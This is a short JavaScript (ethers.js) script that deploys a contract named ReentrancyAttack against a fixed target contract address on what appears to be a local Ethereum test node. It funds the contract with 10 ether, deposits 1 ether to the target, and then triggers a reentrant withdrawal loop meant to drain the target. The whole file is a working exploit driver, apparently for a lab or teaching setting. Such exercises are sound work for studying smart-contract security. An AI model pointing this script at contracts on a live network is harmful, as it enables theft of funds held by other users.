const { kStringMaxLength } = require("buffer");
const { ethers } =  require("ethers"); 
const { isAddress } = require("ethers/lib/utils");
const fs = require('fs');

const url = "http://localhost:8545";

const provider = new ethers.providers.JsonRpcProvider(url);

// Getting the accounts
const signer = provider.getSigner(19);

contract_address = "0xdAD42D43ecE0f6e8da8c2BCbC6A25FF6b3922C58"

const metadata = JSON.parse(fs.readFileSync('../artifacts/contracts/ReentrancyAttack.sol/ReentrancyAttack.json').toString())

reentrancyFactory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer)


;(async () => {
    price = ethers.utils.formatUnits(await provider.getGasPrice(), 'gwei')
    deployOptions = {gasLimit: 1000000, gasPrice: ethers.utils.parseUnits(price, 'gwei')}

    reentrancyContract = await reentrancyFactory.deploy(contract_address, deployOptions)
    await reentrancyContract.deployTransaction.wait()
    
    sendEthOptions = {value:ethers.utils.parseEther("10.0")}

    tx = await reentrancyContract.loadEther(sendEthOptions)
    await tx.wait()

    tx = await reentrancyContract.donateToContract(reentrancyContract.address, ethers.utils.parseEther("1.0"))
    await tx.wait()

    tx = await reentrancyContract.startWithdrawal(100000);
    await tx.wait()
})();